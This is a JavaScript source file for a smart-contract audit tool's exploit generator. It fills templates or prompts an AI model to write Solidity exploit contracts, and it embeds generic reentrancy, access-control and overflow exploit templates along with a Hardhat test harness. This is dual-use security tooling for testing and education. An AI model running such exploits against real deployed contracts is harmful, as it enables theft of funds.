/**
 * AI-Powered Vulnerability Generator
 *
 * Generates example exploit code and test cases for detected vulnerabilities.
 * Uses pattern matching, code analysis, and AI models to create realistic
 * vulnerability demonstrations for education and testing.
 */

const ethers = require('ethers');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs-extra');

class VulnerabilityGenerator {
  constructor(config = {}) {
    this.config = {
      templatesDir: config.templatesDir || path.join(process.cwd(), 'templates', 'exploits'),
      outputDir: config.outputDir || path.join(process.cwd(), 'generated', 'exploits'),
      aiModelInterface: config.aiModelInterface || null,
      confidenceThreshold: config.confidenceThreshold || 0.75,
      ...config,
    };

    // Ensure output directory exists
    fs.ensureDirSync(this.config.outputDir);

    // Load vulnerability templates if available
    this.templates = this.loadTemplates();

    this.initialized = true;
  }

  /**
   * Load vulnerability templates from directory
   * @returns {Object} Map of vulnerability types to templates
   */
  loadTemplates() {
    const templates = {};

    try {
      if (fs.existsSync(this.config.templatesDir)) {
        const files = fs.readdirSync(this.config.templatesDir);

        for (const file of files) {
          if (file.endsWith('.js') || file.endsWith('.sol')) {
            const templateType = file.split('.')[0].toLowerCase();
            const templatePath = path.join(this.config.templatesDir, file);
            const templateContent = fs.readFileSync(templatePath, 'utf8');

            templates[templateType] = templateContent;
          }
        }
      }
    } catch (error) {
      console.error('Error loading vulnerability templates:', error);
    }

    return templates;
  }

  /**
   * Generate an exploit for a specific vulnerability
   * @param {Object} vulnerability - The vulnerability to generate an exploit for
   * @param {Object} options - Additional options for generation
   * @returns {Promise<Object>} Generated exploit
   */
  async generateExploit(vulnerability, options = {}) {
    if (!this.initialized) {
      throw new Error('VulnerabilityGenerator is not initialized');
    }

    try {
      const vulnerabilityType = vulnerability.classification || 'unknown';

      // Generate a unique ID for this exploit
      const exploitId = `exploit-${crypto.randomBytes(4).toString('hex')}`;

      // Select generation method based on vulnerability type and available resources
      let generatedExploit;

      // If we have a matching template, use it as a base
      if (this.templates[vulnerabilityType.toLowerCase()]) {
        generatedExploit = await this.generateFromTemplate(vulnerability, options);
      }
      // If we have an AI model interface, use it
      else if (this.config.aiModelInterface) {
        generatedExploit = await this.generateWithAI(vulnerability, options);
      }
      // Fallback to pattern-based generation
      else {
        generatedExploit = this.generateFromPatterns(vulnerability, options);
      }

      // Add metadata to the exploit
      const result = {
        id: exploitId,
        vulnerabilityId: vulnerability.id,
        vulnerabilityType,
        generatedAt: new Date().toISOString(),
        code: generatedExploit.code,
        language: generatedExploit.language || 'solidity',
        description:
          generatedExploit.description || `Exploit for ${vulnerabilityType} vulnerability`,
        executionInstructions: generatedExploit.executionInstructions || [],
        testCase: generatedExploit.testCase,
        confidence: generatedExploit.confidence || 0.5,
      };

      // Save the exploit to the output directory if requested
      if (options.save !== false) {
        const outputPath = path.join(
          this.config.outputDir,
          `${vulnerabilityType.toLowerCase()}_${exploitId}.${generatedExploit.language === 'javascript' ? 'js' : 'sol'}`
        );

        await fs.writeFile(outputPath, this.formatExploitFile(result));
        result.filePath = outputPath;
      }

      return result;
    } catch (error) {
      console.error('Error generating exploit:', error);
      return {
        error: error.message,
        success: false,
      };
    }
  }

  /**
   * Generate an exploit from a template
   * @param {Object} vulnerability - The vulnerability to generate an exploit for
   * @param {Object} options - Additional options for generation
   * @returns {Promise<Object>} Generated exploit
   */
  async generateFromTemplate(vulnerability, options = {}) {
    const vulnerabilityType = vulnerability.classification.toLowerCase();
    let template = this.templates[vulnerabilityType];

    // Replace template variables with actual values
    template = template
      .replace(/\{\{CONTRACT_NAME\}\}/g, vulnerability.contractName || 'VulnerableContract')
      .replace(/\{\{FUNCTION_NAME\}\}/g, vulnerability.functionName || 'vulnerableFunction')
      .replace(/\{\{VULNERABILITY_DESCRIPTION\}\}/g, vulnerability.description || 'A vulnerability')
      .replace(/\{\{EXPLOIT_DATE\}\}/g, new Date().toISOString().split('T')[0]);

    // Determine language from template
    const language = template.includes('pragma solidity') ? 'solidity' : 'javascript';

    // Generate a simple test case
    const testCase = this.generateTestCase(vulnerability, language);

    return {
      code: template,
      language,
      testCase,
      confidence: 0.9,
      description: `Template-based exploit for ${vulnerabilityType} vulnerability`,
      executionInstructions: [
        'Deploy the exploit contract to a test network',
        "Call the exploit function with the vulnerable contract's address",
        'Verify the exploit succeeded by checking the state changes',
      ],
    };
  }

  /**
   * Generate an exploit using AI
   * @param {Object} vulnerability - The vulnerability to generate an exploit for
   * @param {Object} options - Additional options for generation
   * @returns {Promise<Object>} Generated exploit
   */
  async generateWithAI(vulnerability, options = {}) {
    const aiModel = this.config.aiModelInterface;

    // Construct the prompt for the AI
    const prompt = `
Generate a Solidity exploit for the following vulnerability:
Type: ${vulnerability.classification || 'Unknown'}
Description: ${vulnerability.description || 'No description provided'}
Contract Name: ${vulnerability.contractName || 'VulnerableContract'}
Affected Function: ${vulnerability.functionName || 'Unknown'}
Affected Lines: ${vulnerability.lines?.join(', ') || 'Unknown'}

Code snippet:
${vulnerability.code || 'No code provided'}

Generate ONLY the exploit contract code that would demonstrate this vulnerability.
Include detailed comments explaining how the exploit works.
`;

    // Generate the exploit code using the AI model
    const aiResponse = await aiModel.generateCode(prompt, {
      temperature: 0.7,
      maxTokens: 1000,
    });

    // Extract the code from the AI response
    let code;
    let language = 'solidity';

    if (typeof aiResponse === 'string') {
      // Extract code block if present
      const codeMatch = aiResponse.match(/```(?:solidity|javascript)?\s*([\s\S]*?)```/);
      code = codeMatch ? codeMatch[1].trim() : aiResponse;

      // Detect language
      language = aiResponse.includes('pragma solidity') ? 'solidity' : 'javascript';
    } else {
      code = aiResponse.code || '';
      language = aiResponse.language || 'solidity';
    }

    // Generate a test case
    const testCase = await this.generateTestCaseWithAI(vulnerability, code, language);

    return {
      code,
      language,
      testCase,
      confidence: aiResponse.confidence || 0.8,
      description:
        aiResponse.description ||
        `AI-generated exploit for ${vulnerability.classification} vulnerability`,
      executionInstructions: aiResponse.executionInstructions || [
        'Deploy the exploit contract to a test network',
        "Call the exploit function with the vulnerable contract's address",
        'Verify the exploit succeeded by checking the state changes',
      ],
    };
  }

  /**
   * Generate an exploit based on vulnerability patterns
   * @param {Object} vulnerability - The vulnerability to generate an exploit for
   * @param {Object} options - Additional options for generation
   * @returns {Object} Generated exploit
   */
  generateFromPatterns(vulnerability, options = {}) {
    const vulnerabilityType = vulnerability.classification?.toLowerCase() || 'unknown';

    // Basic exploit templates for common vulnerability types
    const templates = {
      reentrancy: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyExploit {
    address target;
    uint256 initialBalance;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() external payable {
        initialBalance = address(this).balance;
        // Initial call to vulnerable function
        (bool success,) = target.call{value: 1 ether}(
            abi.encodeWithSignature("vulnerableFunction()")
        );
        require(success, "Initial call failed");
    }
    
    // Fallback function that will be called during reentrancy
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            // Reenter the vulnerable function
            (bool success,) = target.call{value: 0}(
                abi.encodeWithSignature("vulnerableFunction()")
            );
            require(success, "Reentrant call failed");
        }
    }
    
    function withdraw() external {
        uint256 amount = address(this).balance;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Withdraw failed");
    }
}`,
      'access-control': `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControlExploit {
    address target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function exploit() external {
        // Call unprotected admin function
        (bool success,) = target.call(
            abi.encodeWithSignature("unprotectedAdminFunction()")
        );
        require(success, "Exploit failed");
    }
}`,
      arithmetic: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ArithmeticExploit {
    address target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function exploit() external {
        // Exploit integer overflow/underflow
        (bool success,) = target.call(
            abi.encodeWithSignature("vulnerableFunction(uint256)", type(uint256).max)
        );
        require(success, "Exploit failed");
    }
}`,
      default: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GenericExploit {
    address target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function exploit() external payable {
        // Basic exploit attempt
        (bool success,) = target.call{value: msg.value}(
            abi.encodeWithSignature("vulnerableFunction()")
        );
        require(success, "Exploit attempt failed");
    }
    
    // Receive function to handle any returned Ether
    receive() external payable {}
}`,
    };

    // Select template based on vulnerability type
    const template = templates[vulnerabilityType] || templates.default;

    // Generate a test case
    const testCase = this.generateTestCase(vulnerability, 'solidity');

    return {
      code: template,
      language: 'solidity',
      testCase,
      confidence: 0.6,
      description: `Pattern-based exploit for ${vulnerabilityType} vulnerability`,
      executionInstructions: [
        'Deploy the exploit contract to a test network',
        "Call the exploit function with the vulnerable contract's address",
        'Verify the exploit succeeded by checking the state changes',
      ],
    };
  }

  /**
   * Generate a test case for the exploit
   * @param {Object} vulnerability - The vulnerability to generate a test case for
   * @param {string} language - The language of the exploit
   * @returns {string} Generated test case
   */
  generateTestCase(vulnerability, language) {
    const testTemplate = `
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("${vulnerability.classification || 'Vulnerability'} Exploit Test", function() {
  let vulnerableContract;
  let exploitContract;
  let owner;
  let attacker;

  beforeEach(async function() {
    [owner, attacker] = await ethers.getSigners();
    
    // Deploy the vulnerable contract
    const VulnerableContract = await ethers.getContractFactory("${vulnerability.contractName || 'VulnerableContract'}");
    vulnerableContract = await VulnerableContract.deploy();
    await vulnerableContract.deployed();
    
    // Deploy the exploit contract
    const ExploitContract = await ethers.getContractFactory("${vulnerability.classification || 'Generic'}Exploit");
    exploitContract = await ExploitContract.connect(attacker).deploy(vulnerableContract.address);
    await exploitContract.deployed();
  });

  it("should successfully exploit the vulnerability", async function() {
    // Setup initial state
    
    // Execute the exploit
    await exploitContract.connect(attacker).exploit({ value: ethers.utils.parseEther("1.0") });
    
    // Verify the exploit was successful
    // Add appropriate assertions here
    
    // Clean up / withdraw exploited assets
    if (await ethers.provider.getBalance(exploitContract.address) > 0) {
      await exploitContract.connect(attacker).withdraw();
    }
  });
});`;

    return testTemplate;
  }

  /**
   * Generate a test case using AI
   * @param {Object} vulnerability - The vulnerability to generate a test case for
   * @param {string} exploitCode - The exploit code
   * @param {string} language - The language of the exploit
   * @returns {Promise<string>} Generated test case
   */
  async generateTestCaseWithAI(vulnerability, exploitCode, language) {
    if (!this.config.aiModelInterface) {
      return this.generateTestCase(vulnerability, language);
    }

    const aiModel = this.config.aiModelInterface;

    // Construct the prompt for the AI
    const prompt = `
Generate a Hardhat/Ethers.js test case for the following exploit:

Vulnerability Type: ${vulnerability.classification || 'Unknown'}
Description: ${vulnerability.description || 'No description provided'}

Exploit code:
${exploitCode}

Generate ONLY the JavaScript test code that would demonstrate this exploit working.
Include setup, execution of the exploit, and verification that the exploit worked.
`;

    // Generate the test case using the AI model
    const aiResponse = await aiModel.generateCode(prompt, {
      temperature: 0.7,
      maxTokens: 1000,
    });

    // Extract the code from the AI response
    let testCode;

    if (typeof aiResponse === 'string') {
      // Extract code block if present
      const codeMatch = aiResponse.match(/```(?:javascript|js)?\s*([\s\S]*?)```/);
      testCode = codeMatch ? codeMatch[1].trim() : aiResponse;
    } else {
      testCode = aiResponse.code || '';
    }

    return testCode;
  }

  /**
   * Format the exploit file with metadata as comments
   * @param {Object} exploit - The exploit object
   * @returns {string} Formatted exploit file content
   */
  formatExploitFile(exploit) {
    const language = exploit.language || 'solidity';

    if (language === 'solidity') {
      return `// SPDX-License-Identifier: MIT
// Generated by Audityzer VulnerabilityGenerator
// Vulnerability: ${exploit.vulnerabilityType}
// Generated: ${exploit.generatedAt}
// Confidence: ${exploit.confidence}
// 
// Description: 
// ${exploit.description}
//
// Execution Instructions:
${exploit.executionInstructions.map(i => `// - ${i}`).join('\n')}
//
// IMPORTANT: This is an educational example only. 
// DO NOT use on production systems or against contracts without permission.

${exploit.code}`;
    } else {
      return `/**
 * Generated by Audityzer VulnerabilityGenerator
 * Vulnerability: ${exploit.vulnerabilityType}
 * Generated: ${exploit.generatedAt}
 * Confidence: ${exploit.confidence}
 * 
 * Description: 
 * ${exploit.description}
 *
 * Execution Instructions:
 ${exploit.executionInstructions.map(i => ` * - ${i}`).join('\n')}
 *
 * IMPORTANT: This is an educational example only. 
 * DO NOT use on production systems or against contracts without permission.
 */

${exploit.code}`;
    }
  }

  /**
   * Generate test cases for multiple vulnerabilities
   * @param {Array} vulnerabilities - List of vulnerabilities
   * @param {Object} options - Additional options for generation
   * @returns {Promise<Array>} List of generated exploits
   */
  async generateBatch(vulnerabilities, options = {}) {
    if (!this.initialized) {
      throw new Error('VulnerabilityGenerator is not initialized');
    }

    const results = [];

    for (const vulnerability of vulnerabilities) {
      try {
        const exploit = await this.generateExploit(vulnerability, options);
        results.push(exploit);
      } catch (error) {
        console.error(`Error generating exploit for vulnerability ${vulnerability.id}:`, error);
        results.push({
          vulnerabilityId: vulnerability.id,
          error: error.message,
          success: false,
        });
      }
    }

    return results;
  }
}

module.exports = VulnerabilityGenerator;
